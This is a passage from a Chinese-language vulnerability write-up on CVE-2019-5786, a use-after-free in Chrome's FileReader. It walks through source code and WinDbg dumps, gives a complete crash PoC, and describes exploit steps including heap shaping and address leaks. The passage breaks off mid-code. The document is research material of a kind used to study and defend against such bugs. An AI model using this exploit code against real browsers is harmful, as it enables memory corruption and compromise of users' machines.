class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">scoped_refptr&lt;ArrayBuffer&gt; <span class="title">ArrayBuffer::Create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span>* source, <span class="keyword">size_t</span> byte_length)</span> </span>&#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared, ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">UNLIKELY</span>(!contents.<span class="built_in">Data</span>()))</span><br><span class="line">    <span class="built_in">OOM_CRASH</span>();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::<span class="built_in">AdoptRef</span>(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;<span class="built_in">Data</span>(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;<span class="comment">//调试时发现，在32位程序中，buffer-&gt;Data()的地址每回都在变化，有时候可能会重用，而source的地址是固定的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时我们从该函数抽出，返回到最开始代码位置，查看DOMArrayBuffer* Create函数逻辑</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#third_party/blink/renderer/core/fileapi/file_reader_loader.cc</span><br><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br><span class="line"></span><br><span class="line">#third_party/blink/renderer/core/typed_arrays/dom_array_buffer.<span class="function">h</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(std::<span class="built_in">move</span>(buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出通过std::move操作了buffer缓冲区，关于std::move在背景知识的第5部分已经进行了描述，这里的作用是将该缓冲区的所有权从主线程转移到了worker线程。</p><h4 id="（2）动态调试"><a href="#（2）动态调试" class="headerlink" title="（2）动态调试"></a>（2）动态调试</h4><h5 id="（1）触发相关函数"><a href="#（1）触发相关函数" class="headerlink" title="（1）触发相关函数"></a>（1）触发相关函数</h5><p>首先编写代码触发函数调用，通过动态调试查看我们关心的数据结构并理清程序的执行流</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> blob = <span class="keyword">new</span> Blob([contents]);</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">`[onprogress] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">`[onloadend] read length = 0x<span class="subst">$&#123;evt.target.result.byteLength.toString(<span class="number">0x10</span>)&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure><p>执行结果如下，可以看出onprogress和onloadend都会处理长度为0x8000000的情况</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526175135865.png" alt="image-20210526175135865"></p><p>动态调试分析下源代码中下面的这段逻辑代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::<span class="built_in">Create</span>(raw_data_-&gt;<span class="built_in">ToArrayBuffer</span>());</span><br></pre></td></tr></table></figure><p>查看ArrayBuffer::Create()函数的返回值。返回的是一个buffer结构体简介指针，可以通过这个指针获取到ByteLength()和Data()。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526152211843.png" alt="image-20210526152211843"></p><p>而这个返回值我们关心的内存地址可以通过下面的表达式获取，其中偏移0x4的位置为data数据存放位置，偏移0x8的位置为返回的buffer的大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">009cedb8  49c04f20 009cedbc d1bd2bff 3b0937a0</span><br><span class="line">0:000&gt; dd poi(poi(eax)+4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure><p>再经由上层的DOMArrayBuffer::Create()函数处理之后，返回值为0x58954e00。同样可以通过这个指针获取到ByteLength()和Data()。</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526155314949.png" alt="image-20210526155314949"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd eax L4</span><br><span class="line">58954e00  1331e300 00000000 49c04f20 00000000</span><br><span class="line">0:000&gt; dd poi(poi(eax+0x8)+0x4) L4</span><br><span class="line">49c68220  00000001 1c204000 07300000 10e9de4c</span><br></pre></td></tr></table></figure><p>ToArrayBuffer()函数调用了ArrayBuffer::Create()函数来分配buffer，而ArrayBuffer::Create()的返回值实际上也正是ToArrayBuffer()的返回值。是上面的0x009cedb8，将该返回值作为DOMArrayBuffer::Create()函数的参数，该函数同样得到了一个返回值0x58954e00。</p><h5 id="（2）简单梳理"><a href="#（2）简单梳理" class="headerlink" title="（2）简单梳理"></a>（2）简单梳理</h5><p>简单梳理下代码静态分析以及刚刚动态调试得到的结果。还是拿之前的FileReaderLoader::ArrayBufferResult()代码进行描述：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::<span class="function"><span class="title">ArrayBufferResult</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> nullptr;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        -<span class="number">1</span> * static_cast&lt;int64_t&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于先执行了DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());再对 finished_loading_进行判断以对array_buffer_result_进行赋值，之后在代码的最上面对 array_buffer_result_ 进行判断，所以就存在这样一个问题：文件加载完成后，ToArrayBuffer逻辑中对buffer_-&gt;ByteLength与bytes_used_是否相等的判断才会成功，从而从而直接返回缓冲区的指针，否则返回指向该缓冲区副本的指针。我们聚焦下直接返回缓冲区的指针的情况，此时返回的指针result可以间接指向buffer的缓冲区，之后finished_loading_加载完成，执行了语句 <strong>array_buffer_result_ = result;</strong> 这样我们下次进入该函数时，通过了第三行代码的判断，直接放回间接指向buffer缓冲区的指针，此时原来的result指针也可以操作buffer缓冲区，由于两个指针可以同时操作一块地址空间，这就造成了UAF。</p><p>下面是调试记录</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210526190651045.png" alt="image-20210526190651045"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#下面的四个内存分布对应了上面的四次事件触发</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957318  1331e300 00000000 49c04680 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957328  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd eax</span><br><span class="line">58957338  1331e300 00000000 49c04820 00000000</span><br><span class="line">0:000&gt; dd esi</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c04680</span><br><span class="line">49c04680  00000001 49c6a560 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000003 49c6a4c0 00000000 00000000</span><br><span class="line">0:000&gt; dd 49c04820</span><br><span class="line">49c04820  00000002 49c6a4c0 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 49c6a560</span><br><span class="line">49c6a560  00000001 a0204000 07ff0000 10e9de4c#第一次为bytes_used_还小于buffer_-&gt;ByteLength时，此时偏移0x8位置为临时buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c#后面三次为bytes_used_等于buffer_-&gt;ByteLength时，此时偏移0x8位置为真实要操作的buffer</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line">0:000&gt; dd 49c6a4c0</span><br><span class="line">49c6a4c0  00000001 80004000 08000000 10e9de4c</span><br><span class="line"></span><br><span class="line">#此时可见58957328与58957338两个指针都可以操作49c04820这块空间，进而控制buffer，如果释放掉其中一个而使用另外一个，则会造成UAF。</span><br><span class="line">0:000&gt; dd 58957328</span><br><span class="line">58957328  1331e300 095520d8 49c04820 00a80010</span><br><span class="line">58957338  1331e300 09551ff8 49c04820 00000000</span><br></pre></td></tr></table></figure><p>对上面的内存现场进行分析</p><blockquote><p>1、第一次尚未读取完成，返回的指针指向临时buffer中。大小0x07ff0000。</p><p>2、第二次读取完成，但是此时finished_loading_还未置为1，返回真实buffer。大小0x08000000。</p><p>3、第三次读取完成，此时finished_loading_已经置为1，并对array_buffer_result_进行了赋值。返回真实buffer。大小0x08000000。与2的指针值不相同。</p><p>2、第四次读取完成，触发onloadend，返回真实buffer。大小0x08000000，与3的指针值相同。</p></blockquote><p>简单来说就是由于逻辑错误使两个指针可以操作同一块内存，而且可以发现最后两个onprogress指针地址就是不相同的，而onloadend与最后一个onprogress的指针是相同的。所以poc或者exp的构造方式就有两种情况：</p><blockquote><p>1、找到最后两个相同大小的onprogress指针进行操作。（下面exp的方式）</p><p>2、找到倒数第二个onprogress指针与onloadend指针进行操作，当然也需要这两个指针指向的长度相同。（下面poc的方式）</p></blockquote><h4 id="（3）POC分析"><a href="#（3）POC分析" class="headerlink" title="（3）POC分析"></a>（3）POC分析</h4><p>代码如下，这里的代码参考[14]</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        ab1 = event.target.result;<span class="comment">//event.target.result：事件的元素</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;<span class="comment">//这里判断下ab1和ab2的指针是否相同，但是我在调试中发现event.target.result返回的是type，不是很能理解</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);<span class="comment">//这里将前四个字节改成0x61616161</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;<span class="comment">//这里验证下ab1和ab2是否可以操作同一块空间</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;verify succeed! try crash self...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            crash();<span class="comment">//尝试触发崩溃。</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">&#x27;verify failed, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">&#x27;failed this time, retry now...&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);<span class="comment">//如果验证失败则会重新进行尝试</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">&#x27;A&#x27;</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);<span class="comment">//这里的Blob为Binary Large Object的缩写，File继承自Blob</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="javascript">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="javascript">    reader.readAsArrayBuffer(blob);<span class="comment">//FileReader.readAsText()可以轻易地处理一个300k的日志文件，但当日志文件有1G到2G那么大，浏览器就会崩溃。这是因为readAsText()会一下子把目标文件加载至内存，导致内存超出上限。所以如果Web应用常常需要处理大文件时，我们应该使用FileReader.readAsArrayBuffer()来一块一块读取文件。而onProgress每当读取blob时就会触发，而onloadend为当文件加载或读取完成后触发。</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;worker.js&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        worker.postMessage(ab1, [ab1, ab2]);<span class="comment">//核心是通过postmessage进行触发crash，postmessage定义参考[15]，其中第一个参数为aMessage，表示要发送的消息（可能是变量值也可能是结构体），第二个参数为transferList，这个参数可选，用于传递所有权。如果一个对象的所有权被转移，在发送它的上下文中将变为不可用（中止），并且只有在它被发送到的worker中可用。转移所有权这个过程中所以我们在转移ab1的所有权后再转移ab2时会抛出异常。调试时发现postMessage调用了chrome_child!WTF::ArrayBufferContents::FreeMemory函数释放掉了内存</span></span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);<span class="comment">//此时再对该空间进行写操作即可触发UAF</span></span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">init();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc思路已经再poc注释中描述的很清晰了，核心思路就是通过onProgress和onLoadEnd得到两个可以指向相同结构体的指针，然后通过postMessage释放其中的一个指针，之后再使用了第二个指针触发漏洞。</p><p>运行查看可用性，发现成功触发crash</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210527092652671.png" alt="image-20210527092652671"></p><p>附加windbg，可以查看到相关内存现场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; g</span><br><span class="line">(8b4.1ea4): Access violation - code c0000005 (!!! second chance !!!)</span><br><span class="line">eax=00000004 ebx=008fe6a8 ecx=00000042 edx=00000042 esi=00000042 edi=13e04000</span><br><span class="line">eip=106dbd06 esp=0053eb2c ebp=0053eb54 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202</span><br><span class="line">chrome_child!Builtins_DataViewPrototypeSetUint32+0x386:</span><br><span class="line">106dbd06 881407          mov     byte ptr [edi+eax],dl      ds:002b:13e04004=??</span><br><span class="line">0:000&gt; dd edi L1</span><br><span class="line">13e04000  ????????</span><br></pre></td></tr></table></figure><p>此时edi指向的内存已经被释放了，当使用另一块指向同样内存的指针时将会触发访问错误。</p><h4 id="（4）exp分析"><a href="#（4）exp分析" class="headerlink" title="（4）exp分析"></a>（4）exp分析</h4><p>exp打印日志如下，详细代码见[13]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hello, world!</span><br><span class="line">exploit.js:332 Array buffer allocation failed</span><br><span class="line">exploit.js:341 attempt 0 started</span><br><span class="line">exploit.js:289 onloadend attempt 1 after 76 onprogress callbacks</span><br><span class="line">exploit.js:54 found possible candidate objectat idx 4190250</span><br><span class="line">exploit.js:188 leaked absolute address of our object 5e0009c</span><br><span class="line">exploit.js:189 leaked absolute address of ta 4e04000</span><br><span class="line">exploit.js:70 found object idx in the spray array: 201 816</span><br><span class="line">exploit.js:199 addrof(reader_obj) == 98566301</span><br><span class="line">exploit.js:110 found corruptable Uint32Array-&gt;elements at 4ec1118, on Uint32Array idx 17 837</span><br><span class="line">exploit.js:246 success</span><br></pre></td></tr></table></figure><p>exp分析步骤参考[11]，[15]</p><h5 id="（1）分配128Mib字符串"><a href="#（1）分配128Mib字符串" class="headerlink" title="（1）分配128Mib字符串"></a>（1）分配128Mib字符串</h5><p>分配一个较大的字符串（128MiB），它将用作传递给<em>FileReader</em>的<em>Blob</em>的源。该分配将最终在自下而上的分配之后在自由区域中进行（从上面列出的地址空间中的<em>36690000开始</em>）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> string_size = <span class="number">128</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">let</span> contents = <span class="built_in">String</span>.prototype.repeat.call(<span class="string">&#x27;Z&#x27;</span>, string_size);</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> File([contents], <span class="string">&quot;text.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h5 id="（2）-堆布局"><a href="#（2）-堆布局" class="headerlink" title="（2） 堆布局"></a>（2） 堆布局</h5><p>在32位win7系统中通过申请1GB的ArrayBuffer，Chrome会尝试释放512MB保留内存，而分配失败的OOM异常可以被脚本捕获使得render进程不会crash，最终导致前面申请的128MB的ArrayBuffer在这块512MB内存上分配，不受隔离堆保护，释放后可以被其他js对象占位。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> failure = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">1024</span>);      </span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（3）获取触发UAF的两个指针"><a href="#（3）获取触发UAF的两个指针" class="headerlink" title="（3）获取触发UAF的两个指针"></a>（3）获取触发UAF的两个指针</h5><p>调用<em>FileReader.readAsArrayBuffer</em>。将触发多个<em>onprogress</em>事件，如果事件的时间安排正确，则最后两个事件可以返回对同一基础ArrayBuffer的引用。可以无限重复此步骤，直到成功为止，而不会导致过程崩溃。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reader.onprogress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    force_gc();</span><br><span class="line">    <span class="keyword">let</span> res = evt.target.result;</span><br><span class="line">    <span class="comment">// console.log(`onprogress $&#123;onprogress_cnt&#125;`);</span></span><br><span class="line">    onprogress_cnt += <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (res.byteLength != f.size) &#123;</span><br><span class="line">        <span class="comment">// console.log(`result has a different size than expected: $&#123;res.byteLength&#125;`);</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    lastlast = last;   </span><br><span class="line">    last = res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        try_cnt += <span class="number">1</span>;</span><br><span class="line">        failure = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">if</span> (onprogress_cnt &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`less than 2 onprogress events triggered: <span class="subst">$&#123;onprogress_cnt&#125;</span>, try again`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (lastlast.byteLength != f.size) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lastlast has a different size than expected: <span class="subst">$&#123;lastlast.byteLength&#125;</span>`</span>);</span><br><span class="line">            failure = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (failure === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;retrying in 1 second&#x27;</span>);</span><br><span class="line">  